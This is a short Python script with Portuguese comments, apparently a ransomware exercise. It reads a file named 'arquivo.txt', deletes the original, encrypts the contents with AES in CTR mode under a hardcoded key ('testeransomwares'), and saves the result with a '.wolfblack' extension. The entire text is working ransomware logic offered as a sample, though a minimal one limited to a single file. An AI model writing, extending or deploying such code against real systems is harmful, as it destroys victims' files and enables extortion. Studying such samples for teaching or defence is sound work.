import os
import pyaes

## abrir o arquivo a ser criptografado
file_name = "arquivo.txt"
file = open(file_name, "rb")
file_data = file.read()
file.close()

## remover o arquivo que sera criptografado
os.remove(file_name)

## criando a chave de criptografia
key = b"testeransomwares"
aes = pyaes.AESModeOfOperationCTR(key)

## criptografando o arquivo
crypto_data = aes.encrypt(file_data)

## salvando o arquivo que foi criptografado 
new_file = file_name + ".wolfblack"
new_file = open(f'{new_file}','wb')
new_file.write(crypto_data)
new_file.close()
